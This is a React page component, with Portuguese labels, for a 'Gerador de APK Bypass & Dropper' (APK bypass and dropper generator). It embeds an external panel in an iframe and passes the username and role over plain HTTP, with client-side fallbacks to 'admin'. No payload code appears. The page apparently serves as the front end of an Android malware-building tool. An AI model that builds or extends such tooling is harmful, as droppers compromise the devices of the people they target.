import { useNavigate } from 'react-router-dom';
import { useState, useEffect } from 'react';
import { ArrowLeft, RefreshCw, ExternalLink, ShieldCheck, Zap } from 'lucide-react';
import { authAPI } from '../services/api';

export default function APKBypassIframePage() {
  const navigate = useNavigate();
  const [currentUser, setCurrentUser] = useState<string>(() => localStorage.getItem('username') || '');
  const [currentUserRole, setCurrentUserRole] = useState<string>(() => localStorage.getItem('role') || 'operator');

  useEffect(() => {
    authAPI.me().then(info => {
      if (info && info.username) {
        const role = info.is_admin ? 'admin' : 'operator';
        setCurrentUser(info.username);
        setCurrentUserRole(role);
        localStorage.setItem('username', info.username);
        localStorage.setItem('role', role);
      }
    }).catch(() => {});
  }, []);

  const iframeHost = window.location.hostname;
  const iframePort = ':8080';
  const effectiveUser = currentUser || localStorage.getItem('username') || 'admin';
  const effectiveRole = currentUserRole || localStorage.getItem('role') || 'operator';
  const iframeSrc = `http://${iframeHost}${iframePort}/painel?user=${encodeURIComponent(effectiveUser)}&role=${encodeURIComponent(effectiveRole)}`;

  return (
    <div className="min-h-screen bg-[#190503] text-white flex flex-col">
      {/* Header Superior */}
      <div className="bg-[#290903]/90 border-b border-cyan-500/20 px-6 py-3 flex items-center justify-between shadow-lg backdrop-blur-md">
        <div className="flex items-center gap-4">
          <button
            onClick={() => navigate('/dashboard')}
            className="flex items-center gap-2 px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg text-xs font-bold transition-all border border-slate-700"
          >
            <ArrowLeft className="w-4 h-4" />
            Voltar ao Dashboard
          </button>
          
          <div className="flex items-center gap-2">
            <div className="p-1.5 bg-gradient-to-r from-amber-500 to-red-600 rounded-lg shadow-md">
              <Zap className="w-5 h-5 text-yellow-300 animate-pulse" />
            </div>
            <div>
              <h1 className="text-sm font-black text-transparent bg-clip-text bg-gradient-to-r from-amber-400 via-orange-400 to-red-400 uppercase tracking-wider">
                Gerador de APK Bypass & Dropper
              </h1>
              <p className="text-[10px] font-mono text-cyan-400/80">
                Sessão Conectada: <span className="text-amber-300 font-bold">{effectiveUser}</span> ({effectiveRole.toUpperCase()})
              </p>
            </div>
          </div>
        </div>

        <div className="flex items-center gap-3">
          <span className="flex items-center gap-1.5 text-[11px] font-mono font-bold bg-green-950/60 text-green-400 px-3 py-1 rounded-full border border-green-500/30">
            <ShieldCheck className="w-3.5 h-3.5" />
            Sincronizado: {effectiveUser}
          </span>

          <button
            onClick={() => {
              const iframe = document.getElementById('bypass-frame') as HTMLIFrameElement;
              if (iframe) iframe.src = iframeSrc;
            }}
            className="p-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg border border-slate-700 transition-colors"
            title="Recarregar Gerador"
          >
            <RefreshCw className="w-4 h-4" />
          </button>

          <a
            href={iframeSrc}
            target="_blank"
            rel="noopener noreferrer"
            className="p-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg border border-slate-700 transition-colors"
            title="Abrir em Nova Aba"
          >
            <ExternalLink className="w-4 h-4" />
          </a>
        </div>
      </div>

      {/* Frame Principal incorporando o projeto de bypass */}
      <div className="flex-1 w-full h-full relative bg-[#190503]">
        <iframe
          id="bypass-frame"
          src={iframeSrc}
          className="w-full h-full border-0 absolute inset-0"
          title="Bypass APK Generator"
        />
      </div>
    </div>
  );
}

